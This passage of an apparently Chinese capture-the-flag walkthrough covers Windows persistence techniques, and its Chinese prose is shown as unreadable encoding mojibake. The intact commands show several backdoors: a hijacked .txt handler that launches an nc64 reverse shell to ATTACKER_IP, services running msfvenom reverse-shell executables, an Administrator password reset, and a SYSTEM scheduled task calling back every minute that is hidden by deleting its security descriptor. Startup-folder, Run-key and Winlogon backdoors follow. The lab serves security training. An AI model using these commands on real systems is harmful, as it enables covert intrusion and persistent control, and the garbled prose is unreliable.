ä¸‹ï¼‰ï¼Œåœ¨æœ¬ä¾‹ä¸­ä¸º txtfile ï¼Œæˆ‘ä»¬å°†åœ¨å…¶ä¸­æ‰¾åˆ°è´Ÿè´£å¤„ç† .txt çš„ç¨‹åºçš„å¼•ç”¨æ–‡ä»¶ã€‚å¤§å¤šæ•° ProgID æ¡ç›®åœ¨ shell\\open\\command ä¸‹éƒ½æœ‰ä¸€ä¸ªå­é¡¹ï¼Œå…¶ä¸­æŒ‡å®šäº†å¯¹å…·æœ‰è¯¥æ‰©å±•åçš„æ–‡ä»¶è¿è¡Œçš„é»˜è®¤å‘½ä»¤ï¼š åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå½“æ‚¨å°è¯•æ‰“å¼€ .txt æ–‡ä»¶æ—¶ï¼Œç³»ç»Ÿå°†æ‰§è¡Œ %SystemRoot%\\system32\\NOTEPAD.EXE %1 ï¼Œå…¶ä¸­ %1 è¡¨ç¤ºæ‰“å¼€çš„æ–‡ä»¶çš„åç§°ã€‚å¦‚æœæˆ‘ä»¬æƒ³åŠ«æŒè¿™ä¸ªæ‰©å±•ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨æ‰§è¡Œåé—¨çš„è„šæœ¬æ›¿æ¢å‘½ä»¤ï¼Œç„¶ååƒå¾€å¸¸ä¸€æ ·æ‰“å¼€æ–‡ä»¶ã€‚é¦–å…ˆï¼Œæˆ‘ä»¬åˆ›å»ºä¸€ä¸ªåŒ…å«ä»¥ä¸‹å†…å®¹çš„ ps1 è„šæœ¬å¹¶å°†å…¶ä¿å­˜åˆ° C:\\Windows\\backdoor2.ps1 ï¼š Start-Process -NoNewWindow \"c:\\tools c64.exe\" \"-e cmd.exe ATTACKER_IP 4448\" C:\\Windows\\system32\\NOTEPAD.EXE $args[0] è¯·æ³¨æ„ï¼Œåœ¨ Powershell ä¸­ï¼Œæˆ‘ä»¬å¿…é¡»å°† $args[0] ä¼ é€’ç»™è®°äº‹æœ¬ï¼Œå› ä¸ºå®ƒå°†åŒ…å«è¦æ‰“å¼€çš„æ–‡ä»¶çš„åç§°ï¼Œå¦‚é€šè¿‡ %1 ç»™å‡ºçš„é‚£æ ·ã€‚ ç°åœ¨è®©æˆ‘ä»¬æ›´æ”¹æ³¨å†Œè¡¨é¡¹ä»¥åœ¨éšè—çª—å£ä¸­è¿è¡Œåé—¨è„šæœ¬ï¼š powershell -WindowStyle hidden C:\\Windows\\System32\\backdoor.ps1 %1 æœ€åï¼Œä¸ºåå‘ shell åˆ›å»ºä¸€ä¸ªä¾¦å¬å™¨ï¼Œå¹¶å°è¯•æ‰“å¼€å—å®³è®¡ç®—æœºä¸Šçš„ä»»ä½• .txt æ–‡ä»¶ï¼ˆå¦‚æœéœ€è¦ï¼Œè¯·åˆ›å»ºä¸€ä¸ªï¼‰ã€‚æ‚¨åº”è¯¥ä¼šæ”¶åˆ°ä¸€ä¸ªå…·æœ‰æ‰“å¼€è¯¥æ–‡ä»¶çš„ç”¨æˆ·æƒé™çš„åå‘ shellã€‚ è¿™é‡Œå»ºäº†ä¸ª1.txtç„¶ååŒå‡»æ‰§è¡Œï¼Œå³å¯æ‹¿shell 2.3 æ»¥ç”¨æœåŠ¡ Windows æœåŠ¡æä¾›äº†ä¸€ç§å»ºç«‹æŒä¹…æ€§çš„å¥½æ–¹æ³•ï¼Œå› ä¸ºå®ƒä»¬å¯ä»¥é…ç½®ä¸ºåœ¨å—å®³è®¡ç®—æœºå¯åŠ¨æ—¶åœ¨åå°è¿è¡Œã€‚å¦‚æœæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ä»»ä½•æœåŠ¡ä¸ºæˆ‘ä»¬è¿è¡ŒæŸäº›ä¸œè¥¿ï¼Œæˆ‘ä»¬å°±å¯ä»¥åœ¨æ¯æ¬¡å¯åŠ¨æ—¶é‡æ–°è·å¾—å¯¹å—å®³è®¡ç®—æœºçš„æ§åˆ¶ã€‚ æœåŠ¡åŸºæœ¬ä¸Šæ˜¯åœ¨åå°è¿è¡Œçš„å¯æ‰§è¡Œæ–‡ä»¶ã€‚é…ç½®æœåŠ¡æ—¶ï¼Œæ‚¨å¯ä»¥å®šä¹‰å°†ä½¿ç”¨å“ªä¸ªå¯æ‰§è¡Œæ–‡ä»¶ï¼Œå¹¶é€‰æ‹©è¯¥æœåŠ¡æ˜¯åœ¨è®¡ç®—æœºå¯åŠ¨æ—¶è‡ªåŠ¨è¿è¡Œè¿˜æ˜¯åº”è¯¥æ‰‹åŠ¨å¯åŠ¨ã€‚ æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸¤ç§ä¸»è¦æ–¹å¼æ»¥ç”¨æœåŠ¡æ¥å»ºç«‹æŒä¹…æ€§ï¼šåˆ›å»ºä¸€é¡¹æ–°æœåŠ¡æˆ–ä¿®æ”¹ç°æœ‰æœåŠ¡æ¥æ‰§è¡Œæˆ‘ä»¬çš„æœ‰æ•ˆè´Ÿè½½ã€‚ åˆ›å»ºåé—¨æœåŠ¡ æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤åˆ›å»ºå¹¶å¯åŠ¨åä¸ºâ€œTHMserviceâ€çš„æœåŠ¡ï¼š sc.exe create THMservice binPath= \"net user Administrator Passwd123\" start= auto sc.exe start THMservice Note: There must be a space after each equal sign for the command to work. æ³¨æ„ï¼šæ¯ä¸ªç­‰å·åé¢å¿…é¡»æœ‰ä¸€ä¸ªç©ºæ ¼æ‰èƒ½ä½¿è¯¥å‘½ä»¤èµ·ä½œç”¨ã€‚ æœåŠ¡å¯åŠ¨æ—¶å°†æ‰§è¡Œâ€œnet userâ€å‘½ä»¤ï¼Œå°†ç®¡ç†å‘˜å¯†ç é‡ç½®ä¸º Passwd123 ã€‚è¯·æ³¨æ„è¯¥æœåŠ¡å¦‚ä½•è®¾ç½®ä¸ºè‡ªåŠ¨å¯åŠ¨ (start= auto)ï¼Œä»¥ä¾¿å®ƒæ— éœ€ç”¨æˆ·äº¤äº’å³å¯è¿è¡Œã€‚ é‡ç½®ç”¨æˆ·å¯†ç æ•ˆæœå¾ˆå¥½ï¼Œä½†æˆ‘ä»¬è¿˜å¯ä»¥ä½¿ç”¨ msfvenom åˆ›å»ºä¸€ä¸ªåå‘ shellï¼Œå¹¶å°†å…¶ä¸åˆ›å»ºçš„æœåŠ¡å…³è”èµ·æ¥ã€‚ä½†è¯·æ³¨æ„ï¼ŒæœåŠ¡å¯æ‰§è¡Œæ–‡ä»¶æ˜¯å”¯ä¸€çš„ï¼Œå› ä¸ºå®ƒä»¬éœ€è¦å®ç°ç”±ç³»ç»Ÿå¤„ç†çš„ç‰¹å®šåè®®ã€‚å¦‚æœè¦åˆ›å»ºä¸WindowsæœåŠ¡å…¼å®¹çš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œå¯ä»¥åœ¨msfvenomä¸­ä½¿ç”¨ exe-service æ ¼å¼ï¼š user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4448 -f exe-service -o rev-svc.exe ä¹‹ååœ¨å—å®³æœºä¸Šçš„powershellä¸‹è½½ä¸Šè¿°exe wget http://10.10.51.167:8000/rev-svc.exe -O rev-svc.exe ç„¶åï¼Œæ‚¨å¯ä»¥å°†å¯æ‰§è¡Œæ–‡ä»¶å¤åˆ¶åˆ°ç›®æ ‡ç³»ç»Ÿï¼Œä¾‹å¦‚ C:\\Windows ï¼ˆè¿™é‡Œæˆ‘æ˜¯\\Users\\Administratorï¼‰å¹¶å°†æœåŠ¡çš„ binPath æŒ‡å‘å®ƒï¼šï¼ˆåœ¨powershellæ‰§è¡Œï¼‰ sc.exe create THMservice2 binPath= \"C:\\Users\\Administrator\\rev-svc.exe\" start= auto sc.exe start THMservice2 è¿™åº”è¯¥ä¼šåˆ›å»ºä¸€ä¸ªè¿”å›åˆ°æ”»å‡»è€…è®¡ç®—æœºçš„è¿æ¥ã€‚ ä¿®æ”¹ç°æœ‰æœåŠ¡ è™½ç„¶ä¸ºæŒä¹…æ€§åˆ›å»ºæ–°æœåŠ¡æ•ˆæœå¾ˆå¥½ï¼Œä½†è“é˜Ÿå¯èƒ½ä¼šç›‘æ§æ•´ä¸ªç½‘ç»œä¸Šçš„æ–°æœåŠ¡åˆ›å»ºã€‚æˆ‘ä»¬å¯èƒ½å¸Œæœ›é‡ç”¨ç°æœ‰æœåŠ¡è€Œä¸æ˜¯åˆ›å»ºæœåŠ¡æ¥é¿å…æ£€æµ‹ã€‚é€šå¸¸ï¼Œä»»ä½•ç¦ç”¨çš„æœåŠ¡éƒ½æ˜¯ä¸€ä¸ªå¾ˆå¥½çš„å€™é€‰è€…ï¼Œå› ä¸ºå®ƒå¯ä»¥åœ¨ç”¨æˆ·æ²¡æœ‰æ³¨æ„åˆ°çš„æƒ…å†µä¸‹è¿›è¡Œæ›´æ”¹ã€‚ æ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤è·å–å¯ç”¨æœåŠ¡çš„åˆ—è¡¨ï¼š å¯ä»¥çœ‹åˆ°æœ‰å¾ˆå¤šï¼Œè¿™é‡Œæ”¾ä¸€ä¸ªç®€å•æ¨¡æ¿ C:\\&gt; sc query state=all SERVICE_NAME: THMService1 DISPLAY_NAME: THMService1 TYPE : 10 WIN32_OWN_PROCESS STATE : 1 STOPPED WIN32_EXIT_CODE : 1077 (0x435) SERVICE_EXIT_CODE : 0 (0x0) CHECKPOINT : 0x0 WAIT_HINT : 0x0 æ‚¨åº”è¯¥èƒ½å¤Ÿæ‰¾åˆ°åä¸º THMService3 çš„å·²åœæ­¢æœåŠ¡ã€‚è¦æŸ¥è¯¢æœåŠ¡çš„é…ç½®ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼š C:\\&gt; sc qc THMService3 [SC] QueryServiceConfig SUCCESS SERVICE_NAME: THMService3 TYPE : 10 WIN32_OWN_PROCESS START_TYPE : 2 AUTO_START ERROR_CONTROL : 1 NORMAL BINARY_PATH_NAME : C:\\MyService\\THMService.exe LOAD_ORDER_GROUP : TAG : 0 DISPLAY_NAME : THMService3 DEPENDENCIES : SERVICE_START_NAME : NT AUTHORITY\\Local Service ä½¿ç”¨æœåŠ¡è¿›è¡ŒæŒä¹…åŒ–æ—¶ï¼Œæˆ‘ä»¬å…³å¿ƒä¸‰ä»¶äº‹ï¼š å¯æ‰§è¡Œæ–‡ä»¶ï¼ˆBINARY_PATH_NAMEï¼‰åº”è¯¥æŒ‡å‘æˆ‘ä»¬çš„æœ‰æ•ˆè´Ÿè½½ã€‚ æœåŠ¡ START_TYPE åº”è¯¥æ˜¯è‡ªåŠ¨çš„ï¼Œä»¥ä¾¿æœ‰æ•ˆè´Ÿè½½æ— éœ€ç”¨æˆ·äº¤äº’å³å¯è¿è¡Œã€‚ SERVICE_START_NAME æ˜¯è¿è¡ŒæœåŠ¡çš„å¸æˆ·ï¼Œæœ€å¥½å°†å…¶è®¾ç½®ä¸º LocalSystem ä»¥è·å– SYSTEM æƒé™ã€‚ è®©æˆ‘ä»¬é¦–å…ˆä½¿ç”¨ msfvenom åˆ›å»ºä¸€ä¸ªæ–°çš„åå‘ shellï¼šï¼ˆè¿™é‡Œæˆ‘å°±ç”¨æ—§çš„äº†ï¼‰ è¦é‡æ–°é…ç½®â€œTHMservice3â€å‚æ•°ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼š C:\\&gt; sc config THMservice3 binPath= \"C:\\Windows\\rev-svc2.exe\" start= auto obj= \"LocalSystem\" ç„¶åï¼Œæ‚¨å¯ä»¥å†æ¬¡æŸ¥è¯¢æœåŠ¡çš„é…ç½®ä»¥æ£€æŸ¥æ˜¯å¦ä¸€åˆ‡æŒ‰é¢„æœŸè¿›è¡Œï¼š é‚£æˆ‘ä»¬ç›´æ¥å¯åŠ¨è¯¥æœåŠ¡å³å¯ 2.4 æ»¥ç”¨è®¡åˆ’ä»»åŠ¡ å¦‚æœéœ€è¦ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥ä½¿ç”¨è®¡åˆ’ä»»åŠ¡æ¥å»ºç«‹æŒä¹…æ€§ã€‚æœ‰å¤šç§æ–¹æ³•å¯ä»¥åœ¨ Windows ç³»ç»Ÿä¸­å®‰æ’æœ‰æ•ˆè´Ÿè½½çš„æ‰§è¡Œã€‚è®©æˆ‘ä»¬çœ‹çœ‹å…¶ä¸­çš„ä¸€äº›ï¼š ä»»åŠ¡è°ƒåº¦ç¨‹åº å®‰æ’ä»»åŠ¡çš„æœ€å¸¸è§æ–¹æ³•æ˜¯ä½¿ç”¨å†…ç½®çš„ Windows ä»»åŠ¡è®¡åˆ’ç¨‹åºã€‚ä»»åŠ¡è®¡åˆ’ç¨‹åºå…è®¸å¯¹ä»»åŠ¡å¯åŠ¨æ—¶é—´è¿›è¡Œç²¾ç»†æ§åˆ¶ï¼Œå…è®¸æ‚¨é…ç½®åœ¨ç‰¹å®šæ—¶é—´æ¿€æ´»ã€å®šæœŸé‡å¤ç”šè‡³åœ¨å‘ç”Ÿç‰¹å®šç³»ç»Ÿäº‹ä»¶æ—¶è§¦å‘çš„ä»»åŠ¡ã€‚åœ¨å‘½ä»¤è¡Œä¸­ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ schtasks ä¸ä»»åŠ¡è®¡åˆ’ç¨‹åºäº¤äº’ã€‚è¯¥å‘½ä»¤çš„å®Œæ•´å‚è€ƒå¯ä»¥åœ¨ Microsoft ç½‘ç«™ä¸Šæ‰¾åˆ°ï¼šhttps://docs.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks è®©æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªæ¯åˆ†é’Ÿè¿è¡Œä¸€æ¬¡åå‘ shell çš„ä»»åŠ¡ã€‚åœ¨ç°å®åœºæ™¯ä¸­ï¼Œæ‚¨ä¸å¸Œæœ›è´Ÿè½½å¦‚æ­¤é¢‘ç¹åœ°è¿è¡Œï¼Œä½†æˆ‘ä»¬ä¸æƒ³åœ¨è¿™ä¸ªæˆ¿é—´ç­‰å¾…å¤ªä¹…ï¼š C:\\&gt; schtasks /create /sc minute /mo 1 /tn THM-TaskBackdoor /tr \"c:\\tools c64 -e cmd.exe 10.10.46.173 5555\" /ru SYSTEM SUCCESS: The scheduled task \"THM-TaskBackdoor\" has successfully been created. æ³¨æ„ï¼šè¯·åŠ¡å¿…ä½¿ç”¨ THM-TaskBackdoor ä½œä¸ºä»»åŠ¡åç§°ï¼Œå¦åˆ™æ‚¨å°†ä¸ä¼šè·å¾—è¯¥æ ‡å¿—ã€‚ å‰é¢çš„å‘½ä»¤å°†åˆ›å»ºä¸€ä¸ªâ€œTHM-TaskBackdoorâ€ä»»åŠ¡å¹¶å‘æ”»å‡»è€…æ‰§è¡Œ nc64 åå‘ shellã€‚ /sc å’Œ /mo é€‰é¡¹æŒ‡ç¤ºä»»åŠ¡åº”æ¯åˆ†é’Ÿè¿è¡Œä¸€æ¬¡ã€‚ /ru é€‰é¡¹æŒ‡ç¤ºè¯¥ä»»åŠ¡å°†ä»¥ SYSTEM æƒé™è¿è¡Œã€‚ è¦æ£€æŸ¥æˆ‘ä»¬çš„ä»»åŠ¡æ˜¯å¦å·²æˆåŠŸåˆ›å»ºï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼š C:\\&gt; schtasks /query /tn thm-taskbackdoor Folder: \\ TaskName Next Run Time Status ======================================== ====================== =============== thm-taskbackdoor 5/25/2022 8:08:00 AM Ready è®©æˆ‘ä»¬çš„ä»»åŠ¡éšå½¢ æˆ‘ä»¬çš„ä»»åŠ¡ç°åœ¨åº”è¯¥å·²ç»å¯åŠ¨å¹¶è¿è¡Œï¼Œä½†æ˜¯å¦‚æœå—æ„ŸæŸ“çš„ç”¨æˆ·å°è¯•åˆ—å‡ºå…¶è®¡åˆ’ä»»åŠ¡ï¼Œæˆ‘ä»¬çš„åé—¨å°†ä¼šå¾ˆæ˜æ˜¾ã€‚ä¸ºäº†è¿›ä¸€æ­¥éšè—æˆ‘ä»¬çš„è®¡åˆ’ä»»åŠ¡ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡åˆ é™¤å…¶å®‰å…¨æè¿°ç¬¦ï¼ˆSDï¼‰ä½¿å…¶å¯¹ç³»ç»Ÿä¸­çš„ä»»ä½•ç”¨æˆ·éƒ½ä¸å¯è§ã€‚å®‰å…¨æè¿°ç¬¦åªæ˜¯ä¸€ä¸ª ACLï¼Œå®ƒè¯´æ˜å“ªäº›ç”¨æˆ·æœ‰æƒè®¿é—®è®¡åˆ’ä»»åŠ¡ã€‚å¦‚æœæ‚¨çš„ç”¨æˆ·ä¸å…è®¸æŸ¥è¯¢è®¡åˆ’ä»»åŠ¡ï¼Œæ‚¨å°†æ— æ³•å†çœ‹åˆ°å®ƒï¼Œå› ä¸º Windows åªä¼šå‘æ‚¨æ˜¾ç¤ºæ‚¨æœ‰æƒä½¿ç”¨çš„ä»»åŠ¡ã€‚åˆ é™¤SDç›¸å½“äºç¦æ­¢æ‰€æœ‰ç”¨æˆ·è®¿é—®è®¡åˆ’ä»»åŠ¡ï¼ŒåŒ…æ‹¬ç®¡ç†å‘˜ã€‚ æ‰€æœ‰è®¡åˆ’ä»»åŠ¡çš„å®‰å…¨æè¿°ç¬¦éƒ½å­˜å‚¨åœ¨ HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\ ä¸­ã€‚æ‚¨å°†æ‰¾åˆ°æ¯ä¸ªä»»åŠ¡çš„æ³¨å†Œè¡¨é¡¹ï¼Œå…¶ä¸­åä¸ºâ€œSDâ€çš„å€¼åŒ…å«å®‰å…¨æè¿°ç¬¦ã€‚ä»…å½“æ‚¨æ‹¥æœ‰ SYSTEM æƒé™æ—¶æ‰èƒ½åˆ é™¤è¯¥å€¼ã€‚ ä¸ºäº†éšè—æˆ‘ä»¬çš„ä»»åŠ¡ï¼Œè®©æˆ‘ä»¬åˆ é™¤ä¹‹å‰åˆ›å»ºçš„â€œTHM-TaskBackdoorâ€ä»»åŠ¡çš„ SD å€¼ã€‚ä¸ºæ­¤ï¼Œæˆ‘ä»¬å°†ä½¿ç”¨ psexec ï¼ˆåœ¨ C:\\tools ä¸­æä¾›ï¼‰ä»¥ç³»ç»Ÿæƒé™æ‰“å¼€ Regeditï¼š C:\\&gt; c:\\tools\\pstools\\PsExec64.exe -s -i regedit ç„¶åæˆ‘ä»¬å°†åˆ é™¤ä»»åŠ¡çš„å®‰å…¨æè¿°ç¬¦ï¼š å¦‚æœæˆ‘ä»¬å°è¯•å†æ¬¡æŸ¥è¯¢æˆ‘ä»¬çš„æœåŠ¡ï¼Œç³»ç»Ÿä¼šå‘Šè¯‰æˆ‘ä»¬æ²¡æœ‰è¿™æ ·çš„ä»»åŠ¡ï¼š C:\\&gt; schtasks /query /tn thm-taskbackdoor ERROR: The system cannot find the file specified. å¦‚æœæˆ‘ä»¬åœ¨æ”»å‡»è€…çš„æœºå™¨ä¸Šå¯åŠ¨ä¸€ä¸ª nc ç›‘å¬å™¨ï¼Œæˆ‘ä»¬åº”è¯¥ä¼šåœ¨ä¸€åˆ†é’Ÿåå¾—åˆ°ä¸€ä¸ª shellï¼š 2.5 ç™»å½•è§¦å‘æŒä¹…åŒ– ç”¨æˆ·æ‰§è¡Œçš„æŸäº›æ“ä½œä¹Ÿå¯èƒ½ç»‘å®šåˆ°æ‰§è¡Œç‰¹å®šçš„æœ‰æ•ˆè´Ÿè½½ä»¥å®ç°æŒä¹…æ€§ã€‚ Windows æ“ä½œç³»ç»Ÿæä¾›äº†å¤šç§å°†æœ‰æ•ˆè´Ÿè½½ä¸ç‰¹å®šäº¤äº’ç›¸å…³è”çš„æ–¹æ³•ã€‚æ­¤ä»»åŠ¡å°†ç ”ç©¶æ¤å…¥æœ‰æ•ˆè´Ÿè½½çš„æ–¹æ³•ï¼Œè¿™äº›æœ‰æ•ˆè´Ÿè½½å°†åœ¨ç”¨æˆ·ç™»å½•ç³»ç»Ÿæ—¶æ‰§è¡Œã€‚ å¯åŠ¨æ–‡ä»¶å¤¹ æ¯ä¸ªç”¨æˆ·åœ¨ C:\\Users\\&lt;your_username&gt;\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup ä¸‹éƒ½æœ‰ä¸€ä¸ªæ–‡ä»¶å¤¹ï¼Œæ‚¨å¯ä»¥åœ¨å…¶ä¸­æ”¾ç½®è¦åœ¨ç”¨æˆ·ç™»å½•æ—¶è¿è¡Œçš„å¯æ‰§è¡Œæ–‡ä»¶ã€‚æ”»å‡»è€…åªéœ€å°†æœ‰æ•ˆè´Ÿè½½æ”¾å…¥å…¶ä¸­å³å¯å®ç°æŒä¹…æ€§ã€‚è¯·æ³¨æ„ï¼Œæ¯ä¸ªç”¨æˆ·åªä¼šè¿è¡Œå…¶æ–‡ä»¶å¤¹ä¸­å¯ç”¨çš„å†…å®¹ã€‚ å¦‚æœæˆ‘ä»¬æƒ³å¼ºåˆ¶æ‰€æœ‰ç”¨æˆ·åœ¨ç™»å½•æ—¶è¿è¡Œæœ‰æ•ˆè´Ÿè½½ï¼Œæˆ‘ä»¬å¯ä»¥ä»¥ç›¸åŒçš„æ–¹å¼ä½¿ç”¨ C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp ä¸‹çš„æ–‡ä»¶å¤¹ã€‚ å¯¹äºæ­¤ä»»åŠ¡ï¼Œè®©æˆ‘ä»¬ä½¿ç”¨ msfvenom ç”Ÿæˆåå‘ shell æœ‰æ•ˆè´Ÿè½½ï¼š user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.46.173 LPORT=5555 -f exe -o revshell.exe ç„¶åæˆ‘ä»¬å°†æŠŠæœ‰æ•ˆè´Ÿè½½å¤åˆ¶åˆ°å—å®³è€…æœºå™¨ä¸­ã€‚æ‚¨å¯ä»¥ä½¿ç”¨ Python3 ç”Ÿæˆ http.server å¹¶åœ¨å—å®³è®¡ç®—æœºä¸Šä½¿ç”¨ wget æ¥æå–æ–‡ä»¶ï¼š ç„¶åï¼Œæˆ‘ä»¬å°†æœ‰æ•ˆè´Ÿè½½å­˜å‚¨åˆ° C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp æ–‡ä»¶å¤¹ä¸­ï¼Œä»¥ä¾¿ä¸ºç™»å½•è®¡ç®—æœºçš„ä»»ä½•ç”¨æˆ·è·å– shellã€‚ C:\\&gt; copy revshell.exe \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\\" ç°åœ¨è¯·åŠ¡å¿…ä»å¼€å§‹èœå•æ³¨é”€æ‚¨çš„ä¼šè¯ï¼ˆå…³é—­ RDP çª—å£è¿˜ä¸å¤Ÿï¼Œå› ä¸ºå®ƒä¼šä½¿æ‚¨çš„ä¼šè¯ä¿æŒæ‰“å¼€çŠ¶æ€ï¼‰ï¼š Run / RunOnce æ‚¨è¿˜å¯ä»¥é€šè¿‡æ³¨å†Œè¡¨å¼ºåˆ¶ç”¨æˆ·åœ¨ç™»å½•æ—¶æ‰§è¡Œç¨‹åºã€‚æ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹æ³¨å†Œè¡¨é¡¹æ¥æŒ‡å®šåœ¨ç™»å½•æ—¶è¿è¡Œçš„åº”ç”¨ç¨‹åºï¼Œè€Œä¸æ˜¯å°†æœ‰æ•ˆè´Ÿè½½ä¼ é€’åˆ°ç‰¹å®šç›®å½•ï¼š HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce HKCU ä¸‹çš„æ³¨å†Œè¡¨é¡¹ä»…é€‚ç”¨äºå½“å‰ç”¨æˆ·ï¼Œ HKLM ä¸‹çš„æ³¨å†Œè¡¨é¡¹é€‚ç”¨äºæ‰€æœ‰äººã€‚åœ¨ Run é”®ä¸‹æŒ‡å®šçš„ä»»ä½•ç¨‹åºéƒ½å°†åœ¨ç”¨æˆ·æ¯æ¬¡ç™»å½•æ—¶è¿è¡Œã€‚ RunOnce é”®ä¸‹æŒ‡å®šçš„ç¨‹åºå°†ä»…æ‰§è¡Œä¸€æ¬¡ã€‚ å¯¹äºæ­¤ä»»åŠ¡ï¼Œè®©æˆ‘ä»¬ä½¿ç”¨ msfvenom åˆ›å»ºä¸€ä¸ªæ–°çš„åå‘ shellï¼š user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4451 -f exe -o revshell.exe å°†å…¶ä¼ è¾“åˆ°å—å®³æœºå™¨åï¼Œè®©æˆ‘ä»¬å°†å…¶ç§»åŠ¨åˆ° C:\\Windows\\ ï¼š C:\\&gt; move revshell.exe C:\\Windows ç„¶åï¼Œæˆ‘ä»¬åœ¨ HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run ä¸‹åˆ›å»ºä¸€ä¸ª REG_EXPAND_SZ æ³¨å†Œè¡¨é¡¹ã€‚æ¡ç›®çš„åç§°å¯ä»¥æ˜¯æ‚¨å–œæ¬¢çš„ä»»ä½•å†…å®¹ï¼Œå€¼å°†æ˜¯æˆ‘ä»¬è¦æ‰§è¡Œçš„å‘½ä»¤ã€‚ æ³¨æ„ï¼šåœ¨å®é™…ç¯å¢ƒä¸­ï¼Œæ‚¨å¯ä»¥ä¸ºæ³¨å†Œè¡¨é¡¹ä½¿ç”¨ä»»ä½•åç§°ï¼Œä½†å¯¹äºæ­¤ä»»åŠ¡ï¼Œæ‚¨éœ€è¦ä½¿ç”¨ MyBackdoor æ¥æ¥æ”¶æ ‡å¿—ã€‚ å®Œæˆæ­¤æ“ä½œåï¼Œé€€å‡ºå½“å‰ä¼šè¯å¹¶å†æ¬¡ç™»å½•ï¼Œæ‚¨åº”è¯¥ä¼šæ”¶åˆ°ä¸€ä¸ª shellï¼ˆå¯èƒ½éœ€è¦å¤§çº¦ 10-20 ç§’ï¼‰ã€‚ ç™»å½•ç³»ç»Ÿ ç™»å½•æ—¶è‡ªåŠ¨å¯åŠ¨ç¨‹åºçš„å¦ä¸€ç§æ›¿ä»£æ–¹æ³•æ˜¯æ»¥ç”¨ Winlogonï¼Œè¿™æ˜¯ä¸€ç§ Windows ç»„ä»¶ï¼Œå¯åœ¨èº«ä»½éªŒè¯ï¼ˆé™¤å…¶ä»–å¤–ï¼‰åç«‹å³åŠ è½½æ‚¨çš„ç”¨æˆ·é…ç½®æ–‡ä»¶ã€‚ Winlogon åœ¨ HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\ ä¸‹ä½¿ç”¨ä¸€äº›æ³¨å†Œè¡¨é¡¹ï¼Œè¿™å¯¹äºè·å¾—æŒä¹…æ€§å¯èƒ½å¾ˆæœ‰è¶£ï¼š Userinit æŒ‡å‘ userinit.exe ï¼Œå®ƒè´Ÿè´£æ¢å¤æ‚¨çš„ç”¨æˆ·é…ç½®æ–‡ä»¶é¦–é€‰é¡¹ã€‚ shell æŒ‡å‘ç³»ç»Ÿçš„ shellï¼Œé€šå¸¸æ˜¯ explorer.exe ã€‚ å¦‚æœæˆ‘ä»¬ç”¨ä¸€äº›åå‘ shell æ›¿æ¢ä»»ä½•å¯æ‰§è¡Œæ–‡ä»¶ï¼Œæˆ‘ä»¬å°±ä¼šç ´åç™»å½•åºåˆ—ï¼Œè¿™æ˜¯æˆ‘ä»¬æ‰€ä¸å¸Œæœ›çš„ã€‚æœ‰è¶£çš„æ˜¯ï¼Œæ‚¨å¯ä»¥é™„åŠ ç”¨é€—å·åˆ†éš”çš„å‘½ä»¤ï¼ŒWinlogon å°†å¤„ç†æ‰€æœ‰å‘½ä»¤ã€‚ è®©æˆ‘ä»¬ä»åˆ›å»ºä¸€ä¸ª shell å¼€å§‹ï¼š user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4452 -f exe -o revshell.exe æˆ‘ä»¬å°†åƒä¹‹å‰ä¸€æ ·å°† shell è½¬ç§»åˆ°å—å®³æœºå™¨ä¸Šã€‚ç„¶åæˆ‘ä»¬å¯ä»¥å°† shell å¤åˆ¶åˆ°æˆ‘ä»¬å–œæ¬¢çš„ä»»ä½•ç›®å½•ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å°†ä½¿ç”¨ C:\\Windows ï¼š C:\\&gt; move revshell.exe C:\\Windows ç„¶åæˆ‘ä»¬æ›´æ”¹ HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\ ä¸­çš„ shell æˆ– Userinit ã€‚åœ¨æœ¬ä¾‹ä¸­ï¼Œæˆ‘ä»¬å°†ä½¿ç”¨ Userinit ï¼Œä½†ä½¿ç”¨ shell çš„è¿‡ç¨‹æ˜¯ç›¸åŒçš„ã€‚ æ³¨æ„ï¼šè™½ç„¶ shell å’Œ Userinit éƒ½å¯ç”¨äºåœ¨ç°å®åœºæ™¯ä¸­å®ç°æŒä¹…æ€§ï¼Œä½†è¦è·å–æ­¤æˆ¿é—´ä¸­çš„æ ‡å¿—ï¼Œæ‚¨å°†éœ€è¦ä½¿ç”¨ Userinit ç™»å½•è„šæœ¬ åŠ è½½ç”¨æˆ·é…ç½®æ–‡ä»¶æ—¶ userinit.exe 